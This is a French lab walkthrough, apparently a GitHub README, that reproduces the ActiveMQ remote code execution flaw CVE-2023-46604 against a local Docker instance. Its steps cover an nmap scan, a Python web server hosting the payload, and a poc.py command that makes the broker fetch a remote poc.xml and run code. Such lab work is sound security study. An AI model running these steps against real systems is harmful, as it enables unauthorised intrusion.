CVE 2023-46604

<img width="993" alt="Capture d’écran 2024-10-31 à 19 30 17" src="https://github.com/user-attachments/assets/59de428a-2fdd-487d-9d5d-a7bb4c1ca74b">

Pour commencer, lancez ActiveMQ en arrière-plan dans le dossier activemq_2023 en utilisant:

docker compose up -d

![Capture d’écran 2024-10-28 à 12 38 08](https://github.com/user-attachments/assets/d8f89a89-5db4-443e-ac48-01ada7163acd)

Accédez ensuite à l'interface ActiveMQ dans un navigateur à l'adresse :

http://localhost:8161/admin/

Vous verrez la version d'ActiveMQ, ici (5.17.3) :

![Capture d’écran 2024-10-28 à 12 39 45](https://github.com/user-attachments/assets/1a11852e-ada9-4ece-b2b3-b92e99d1fdbc)

On peut aussi voir la version de activemq dans le fichier docker-compose.yml:

![Capture d’écran 2024-10-28 à 12 40 48](https://github.com/user-attachments/assets/3f82642d-676b-49d2-9f2f-c72d4246717f)

Pour scanner le réseau afin d'identifier les services actifs et leurs versions avec la commande : nmap -p- 192.168.1.145

![Capture d’écran 2024-10-28 à 12 42 12](https://github.com/user-attachments/assets/2377b011-43e0-498a-8ba0-d0a664806038)



Ensuite, pour exploiter ce CVE, ouvrez un port avec la commande suivante :
python3 -m http.server -b 192.168.1.145 6666

![Capture d’écran 2024-10-28 à 12 46 15](https://github.com/user-attachments/assets/89c32c5d-d091-4c45-bbf2-ee755b80f622)

Utilisez ensuite les fichiers poc.py et poc.xml pour envoyer la commande suivante :
python3 poc.py localhost 61616 http://192.168.1.145:6666/poc.xml

Vous pouvez vérifier que la commande a bien été reçue sur le port :
![Capture d’écran 2024-10-28 à 12 49 13](https://github.com/user-attachments/assets/9a0caee3-f648-454d-81c5-5d301b22ccf4)

Ensuite, en écrivant: docker ps -a on peut identifier l'id du container ouvert et qui correspond a activemq.
Grace a cette id on effectue cette commande pour accédez au conteneur:
docker exec -it 55cfcd6ae598 /bin/bash

Enfin, vérifiez dans le dossier /tmp pour voir si l'injection a réussi :
ls -l /tmp/

On  devrait avoir un fichier crée comme celui ci:
-rw-r--r-- 1 root root    0 Oct 28 11:48 activeMQ-RCE-success

Nous avons réussi à créer le fichier activeMQ-RCE-success, ce qui constitue une preuve de l'exécution réussie de l'injection de code à distance à travers une requête malveillante.

![Capture d’écran 2024-10-28 à 12 51 17](https://github.com/user-attachments/assets/569e6db0-2661-4830-94e3-3a686ab5b218)

Cet exploit montre comment CVE-2023-46604 permet une exécution de code à distance via l'injection d'une payload dans ActiveMQ, ouvrant ainsi des voies d'accès non autorisées au système.

